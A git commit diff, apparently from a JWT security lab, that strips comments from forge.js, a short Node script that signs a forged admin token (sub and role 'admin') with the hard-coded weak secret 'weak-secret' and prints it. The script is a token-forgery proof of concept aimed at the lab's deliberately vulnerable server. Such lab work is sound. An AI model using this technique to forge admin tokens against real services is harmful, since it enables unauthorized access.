06dbb81d84172995c4ff5d7d0e34de6351583c5f
hossam-ahmedd <149197378+hossam-ahmedd@users.noreply.github.com>
2025-10-20 23:55:24 +0300

    Update forge.js

--- forge.js
+++ forge.js
@@ -1,14 +1,13 @@
-// forge.js
-// usage: node forge.js
+
 const jwt = require('jsonwebtoken');
 
-// اكتب هنا السر الضعيف الموجود في vuln-server.js
-const WEAK_SECRET = 'weak-secret'; // <-- عدّله لو ملفك فيه قيمة تانية
+
+const WEAK_SECRET = 'weak-secret'; 
 
 const token = jwt.sign(
   { sub: 'admin', role: 'admin' },
   WEAK_SECRET,
-  { algorithm: 'HS256', expiresIn: '7d', issuer: 'jwt-lab' } // نفس الـclaims اللي يحتاجها vuln-demo
+  { algorithm: 'HS256', expiresIn: '7d', issuer: 'jwt-lab' } 
 );
 
 console.log(token);
